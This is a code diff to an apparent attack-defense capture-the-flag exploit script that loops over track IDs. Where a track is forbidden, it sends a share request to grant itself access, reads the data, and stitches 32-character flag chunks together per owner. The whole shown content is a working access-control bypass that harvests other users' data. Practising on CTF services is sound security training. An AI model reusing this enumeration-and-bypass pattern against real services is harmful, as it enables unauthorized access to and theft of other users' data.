@@ -121,7 +121,11 @@ def try_get(client, secret, track_id):
 
 
 def try_hack(client, secret, track_id):
-    client.query(Request.TRACK_REQUEST_SHARE, secret, track_id)
+    response = client.query(Request.TRACK_REQUEST_SHARE, secret, track_id)
+    if response[0] == Response.OK:
+        logging.info("  owner: %s", response[1])
+        return response[1]
+    return None
 
 
 def main():
@@ -147,31 +151,34 @@ def main():
 
     flags_count = 0
 
+    flags = dict()
+
     logging.info("Reading tracks")
     for track_id in range(args.start, args.end+1):
         logging.info("  track #%d ... ", track_id)
-        status, flag = try_get(client, secret, track_id)
+        status, chunk = try_get(client, secret, track_id)
 
-        if flag is not None:
-            logging.info("  => flag: %s", flag)
+        if chunk is not None:
+            logging.info("  => flag chunk: %s", chunk)
             flags_count += 1
             continue
 
         if status == Response.FORBIDDEN:
             logging.info("  %s, trying to hack", Response.to_str(status))
 
-            try_hack(client, secret, track_id)
-            status, flag = try_get(client, secret, track_id)
-            if flag is not None:
-                logging.info("  => flag: %s", flag)
-                flags_count += 1
+            owner = try_hack(client, secret, track_id)
+            status, chunk = try_get(client, secret, track_id)
+            if chunk is not None:
+                logging.info("  => chunk: %s", chunk)
+                flags[owner] = flags.get(owner, "") + chunk
+                if len(flags[owner]) == 32:
+                    logging.info("  => FLAG: %s", flags[owner])
+                    flags_count += 1
                 continue
 
             logging.info("  hack FAILED!")
             break
         logging.info("  => %s", Response.to_str(status))
-        #if status == Response.NOT_FOUND:
-        #    break
 
     logging.info("Found %d flags", flags_count)
 
